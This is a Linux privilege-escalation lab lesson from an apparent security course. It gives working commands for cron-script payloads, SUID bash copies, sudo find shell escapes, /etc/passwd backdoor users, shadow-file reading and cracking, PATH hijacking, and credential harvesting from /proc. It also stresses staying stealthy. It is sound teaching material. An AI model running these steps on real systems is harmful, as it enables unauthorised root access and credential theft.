---
title: "Linux Lab — Privilege Escalation"
tags: [foundation, linux, lab, privilege-escalation, SUID, sudo, capabilities,
       cron, CTF, attacker-mindset, root-shell]
module: 01-Foundation-02
day: 15
related_topics:
  - SUID, Sudo and Package Trust (Day 012)
  - Cron, Env Variables and Capabilities (Day 011)
  - Linux Lab Enumeration (Day 014)
  - Linux PrivEsc — full chain (Day 234)
---

# Day 015 — Linux Lab: Privilege Escalation

## Goals

This is a **pure lab day**. You built your target map on Day 014.
Now you exploit it.

By the end of this lab you will have:

1. Achieved a root shell using at least **two different** escalation paths.
2. Written a one-line explanation for *why* each path worked at the kernel
   or OS level — not just what command you ran.
3. Identified which path is stealthiest (fewest log entries).
4. Cleaned up your footprints from path 1 before switching to path 2.

> "Getting root is the easy part once you've done the recon. The hard part
> is choosing which path creates the least noise — and knowing why."
> — Ghost

---

## Prerequisites

- [Day 014 — Linux Lab: Enumeration and Hidden Files](DAY-0014-Linux-Lab-Enumeration-and-Hidden-Files.md)
- Your completed findings list from Day 014 (you need it here)

---

## Lab Environment

Use the same lab you built on Day 014. Ensure it is in a clean state:

```bash
# Reset — kill any planted shells, restore writable scripts
# If using Docker: docker restart <container_id>
# If using VM snapshot: revert to the post-setup snapshot
```

You start as `lowpriv` with the password `letmein123`.

---

## Escalation Paths Available

Based on your Day 014 findings, the lab contains **six distinct escalation
paths**. Your goal: exploit at least **two**. Document all six — even the
ones you don't exploit.

---

### Path A — Cron Job + Writable Script

**What you found on Day 014:**
`/opt/cron-scripts/collect_stats.sh` is world-writable and runs as root
every minute via `/etc/crontab`.

**Exploit:**

```bash
# Step 1: Plant your payload
echo 'cp /bin/bash /tmp/.r_shell; chmod +s /tmp/.r_shell' \
    >> /opt/cron-scripts/collect_stats.sh

# Step 2: Wait up to 60 seconds for cron to fire
watch -n 1 ls -la /tmp/.r_shell

# Step 3: Use the SUID copy of bash
/tmp/.r_shell -p

# Verify:
id
# uid=1001(lowpriv) gid=1001(lowpriv) euid=0(root) groups=...
```

**Why it works:**
The cron daemon runs as root and executes the script as root. Because the
script is world-writable, any user can append commands. The SUID copy of
bash runs with effective UID = root (the file owner), and `-p` prevents
bash from dropping the elevated EUID on startup.

**Cleanup:**

```bash
rm /tmp/.r_shell
# Restore the original script content:
head -n 2 /opt/cron-scripts/collect_stats.sh > /tmp/orig.sh
mv /tmp/orig.sh /opt/cron-scripts/collect_stats.sh
chmod 777 /opt/cron-scripts/collect_stats.sh
```

---

### Path B — Sudo + find + Shell Escape

**What you found on Day 014:**
`sudo -l` shows: `(root) NOPASSWD: /usr/bin/find`

**Exploit:**

```bash
sudo find / -name "*.conf" -exec /bin/sh -p \; -quit
```

**Why it works:**
`sudo` executes `find` as root. `find`'s `-exec` flag runs a command for
each match. That command (`/bin/sh -p`) inherits the root UID from `find`.
`-quit` stops after the first match to avoid spawning multiple shells.

**Alternative (file write instead of shell):**

```bash
# Write a new root-level user to /etc/passwd
sudo find / -name "*.conf" -exec bash -c \
    'echo "ghost::0:0::/root:/bin/bash" >> /etc/passwd' \; -quit
su ghost   # no password required
```

**Stealth comparison vs Path A:**
Path B creates a sudo log entry:
```
sudo: lowpriv : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/find ...
```
Path A only creates a cron log entry if logging is verbose. For minimal
noise, Path A is stealthier.

---

### Path C — Linux Capability (cap_dac_read_search on Python)

**What you found on Day 014:**
`/usr/bin/python3 = cap_dac_read_search+ep`

`cap_dac_read_search` allows bypassing file read/search permission checks —
it cannot call `setuid(0)`, but it can **read any file**.

**Exploit — read /etc/shadow:**

```bash
python3 -c "print(open('/etc/shadow').read())"
```

**Take it further — crack the root hash:**

```bash
# Copy the shadow line for root
ROOT_HASH=$(python3 -c "
import re
content = open('/etc/shadow').read()
match = re.search(r'^root:([^:]+)', content, re.M)
if match: print(match.group(1))
")
echo "root:$ROOT_HASH" > /tmp/hash.txt

# On your attacker machine (or locally if hashcat installed):
hashcat -m 1800 /tmp/hash.txt /usr/share/wordlists/rockyou.txt
# -m 1800 = sha512crypt ($6$)
```

**Why it works:**
`cap_dac_read_search` means "discretionary access control: ignore read and
search permission checks." The capability is in the `effective` set (`+e`)
so it is active immediately — no special code needed. Any call to `open()`
from this Python process skips permission checks.

**Escalate from read to root (if root's hash is crackable):**

```bash
# If hashcat finds the password:
su root   # Enter cracked password
```

---

### Path D — Non-Standard SUID Binary + PATH Hijack

**What you found on Day 014:**
`/opt/lab_backup` is SUID root. Its source called `system("id")` — a
relative path.

**Exploit:**

```bash
# Create a malicious 'id' in a directory you control
echo '#!/bin/bash' > /tmp/id
echo 'cp /bin/bash /tmp/.shell2; chmod +s /tmp/.shell2' >> /tmp/id
chmod +x /tmp/id

# Set PATH so /tmp comes first
export PATH=/tmp:$PATH

# Run the SUID binary
/opt/lab_backup

# The binary calls system("id") → shell looks for 'id' in PATH →
# finds /tmp/id first → runs as root (EUID 0 from SUID bit)
/tmp/.shell2 -p
```

**Why it works:**
`system(command)` internally calls `/bin/sh -c command`. `/bin/sh` uses
the inherited PATH environment variable to find relative commands. Because
the binary is SUID root and does not reset PATH before calling `system()`,
the attacker's PATH entry wins.

**Note:** Modern `glibc` and some shells clear PATH in setuid contexts —
this works in the lab because it is a controlled environment. In real
targets, this varies by configuration.

---

### Path E — Environment Variable Leakage → Credential Reuse

**What you found on Day 014:**
A background process (`/opt/run_service.sh`) has
`DATABASE_URL=postgresql://admin:labpassword@localhost:5432/production`
in its `/proc/[pid]/environ`.

**Exploit:**

```bash
# Find the PID
pid=$(pgrep -f "run_service.sh")

# Read its environment
cat /proc/$pid/environ | tr '\0' '\n'
# DATABASE_URL=postgresql://admin:labpassword@localhost:5432/production

# If PostgreSQL is running locally:
psql -U admin -h localhost -d production
# Password: labpassword
# (psql will prompt; enter the credential)
# If the 'admin' DB user is a superuser:
psql> \! bash   # Spawn a shell from inside psql — running as postgres user
# Or:
psql> COPY (SELECT 1) TO PROGRAM 'bash -c "cp /bin/bash /tmp/.pg_shell; chmod +s /tmp/.pg_shell"';
```

**Why it works:**
`/proc/[pid]/environ` is world-readable when the process owner matches your
UID OR when you have `CAP_SYS_PTRACE`. In this lab, the service runs as the
same user who launched it (a common misconfiguration in dev environments).
Credentials injected via environment variables are visible to any local user
who can read that process's `/proc` entry.

---

### Path F — SSH Key Discovery → Lateral Movement to root

**What you found on Day 014:**
`/var/backups/.ssh_backup/id_rsa` is a readable SSH private key.

**Exploit:**

```bash
# Check which users/hosts this key can authenticate to
cat /var/backups/.ssh_backup/id_rsa.pub
# backup@lab

# Try SSH with the key as different users
ssh -i /var/backups/.ssh_backup/id_rsa root@localhost
ssh -i /var/backups/.ssh_backup/id_rsa operator@localhost

# If the public key is in root's authorized_keys:
cat /root/.ssh/authorized_keys 2>/dev/null
# You need cap_dac_read_search (Path C) to read this first
# Use Path C to check, then Path F to authenticate

# Copy the key to a location you control (needed if it has wrong perms)
cp /var/backups/.ssh_backup/id_rsa /tmp/lab_key
chmod 600 /tmp/lab_key
ssh -i /tmp/lab_key root@localhost 2>/dev/null
```

---

## Lab Debrief — Required Before Moving On

You must be able to answer these questions out loud (or write them down)
before proceeding to Day 016:

1. **Path A:** Why does `chmod +s` on a copy of bash give you a root shell?
   What does the SUID bit actually do when a file is executed?

2. **Path B:** `sudo find ... -exec /bin/sh -p \;` — why does the resulting
   shell have root privileges? What would happen without `-p`?

3. **Path C:** `cap_dac_read_search` cannot call `setuid(0)` — so why is it
   still a critical finding? How did you turn "read any file" into root?

4. **Path D:** The binary calls `system("id")`. You changed PATH. Why did
   the SUID bit not protect against this? What would have prevented it?

5. **Path E:** Why is reading `/proc/[pid]/environ` of another process
   significant? When can you read it, and when can you not?

6. **Comparison:** Which path generates the **most log noise**? Which
   generates the **least**? Order all six paths from noisiest to stealthiest.

---

## Findings Template — Post-Exploitation

Document your escalation the way a real pentest report would read.

```markdown
## Privilege Escalation Report — Day 015

**Target:** lab-machine
**Starting access:** lowpriv (UID 1001)
**Final access achieved:** root (UID 0)
**Date:** [your date]

---

### Escalation Path 1 — [Name]

**CVSS-ish Severity:** Critical
**Precondition:** [What you needed to have/know before this worked]
**Steps:**
1. [Command]
2. [Command]
3. [Command]
**Root Cause:** [One sentence — the fundamental misconfiguration]
**Evidence of Success:**
\```
root@lab:~# id
uid=0(root) gid=0(root) groups=0(root)
\```
**Remediation:** [The specific fix]
**Log Artefacts Generated:** [What log lines this path created]

---

### Escalation Path 2 — [Name]
...
```

---

## Questions

### Open Questions

*(none yet — add yours here)*

---

### Answered Questions

*(none yet)*

---

*Previous: [Day 014 — Linux Lab: Enumeration and Hidden Files](DAY-0014-Linux-Lab-Enumeration-and-Hidden-Files.md)*
*Next: [Day 016 — Linux Hardening and Forensic Artefacts](DAY-0016-Linux-Hardening-and-Forensic-Artefacts.md)*
